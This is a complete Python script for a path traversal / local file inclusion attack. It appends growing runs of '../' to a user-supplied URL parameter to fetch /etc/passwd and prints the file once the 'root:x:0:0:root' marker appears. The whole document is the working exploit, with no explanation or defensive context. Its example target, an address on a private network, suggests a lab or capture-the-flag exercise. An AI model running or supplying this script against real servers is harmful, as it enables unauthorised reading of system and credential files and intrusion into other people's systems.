import requests

def main():
    # Prompt user for the base URL
    base_url = input("Enter the base URL (e.g. http://172.16.1.10/nav.php?page=): ")

    # Known file to look for
    known_file = "/etc/passwd"

    # Maximum traversal depth
    max_depth = 10

    found = False

    # Iterate through different levels of directory traversal
    for depth in range(1, max_depth + 1):
        traversal = "../" * depth
        url = base_url + traversal + known_file
        print(f"Trying {url}")

        try:
            response = requests.get(url)
            if response.status_code == 200 and "root:x:0:0:root" in response.text:
                print(f"Success! Contents of {known_file} at depth {depth}:")
                print(response.text)
                print(f"\nVulnerable URL: {url}")
                found = True
                break
            else:
                print(f"Failed to access {known_file} at depth {depth} (Status code: {response.status_code})")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

    if not found:
        print("No file found within the maximum traversal depth.")

if __name__ == "__main__":
    main()
